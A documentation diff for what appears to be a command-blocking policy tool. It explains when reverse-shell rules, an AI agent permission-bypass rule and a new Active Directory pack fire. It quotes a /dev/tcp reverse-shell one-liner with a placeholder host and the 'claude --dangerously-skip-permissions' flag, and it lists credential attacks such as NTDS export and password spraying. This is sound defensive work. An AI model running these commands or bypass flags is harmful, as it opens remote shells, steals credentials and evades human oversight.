@@ -57,6 +57,22 @@ finding rather than independent regex and CEL findings.
 Semantic-only rules use the intentionally never-matching RE2 sentinel `a^`
 when a raw command mention cannot safely serve as fallback evidence.
 
+A rule's pattern selects candidates; the fact its owner proves decides. Two
+CRITICAL rules that a hand test often meets show the fact each needs
+(rel-1-0-10:GAP-0178):
+
+- `CMD-REVSHELL-DEVTCP` and `CMD-REVSHELL-BASH` need a shell whose own input
+  and output are tied to the `/dev/tcp` socket, both directions on the same
+  command (`bash -i >& /dev/tcp/HOST/PORT 0>&1`). A one-way write such as
+  `bash -i -c 'echo probe > /dev/tcp/HOST/PORT'` is a probe or a transfer, not
+  a reverse shell, and gets neither finding although the pattern matches.
+- `exec.agent_runtime_bypass_flags` needs an agent run with a bypass flag:
+  the policy-bypass operation of a `claude`, `codex`, `gemini` or `opencode`
+  command (also behind `npx`, `pnpm dlx` or `bunx`).
+  `claude --dangerously-skip-permissions --version` prints a version, starts
+  no session and gets no finding; `claude --dangerously-skip-permissions -p
+  "..."` blocks in every pack.
+
 All trusted-action findings cross a final same-rule proof gate before they can
 affect a block decision. A complete code-owned semantic proof, a complete exact
 built-in CodeGuard proof, or a bounded code-owned exact fallback proof may
@@ -116,6 +132,13 @@ permissive, or strict profiles.
   closed set of `delete --all` workload forms for production-scoped contexts.
 - `infrastructure-destruction-protection` blocks unscoped Terraform, OpenTofu,
   and Pulumi destruction while allowing plans, previews, and targeted changes.
+- `active-directory-protection` blocks Kerberos ticket requests, NTDS database
+  export, NetExec/CrackMapExec credential use and password spraying against
+  domain services, and bulk LDAP collection. Assign it to a connector on a
+  host that can reach a managed Active Directory domain. Without the pack, the
+  built-in default already alerts on credentialed NetExec/CrackMapExec
+  (`credential.directory_ticket_request`, HIGH) and strict blocks it; the pack
+  blocks it in every profile.
 - `ssh-authorized-keys-protection` is a contract only and cannot be activated.
   It defines how an approved-fingerprint allowlist would guard writes to
   `~/.ssh/authorized_keys`. Do not point `policy_dir` at it; see its
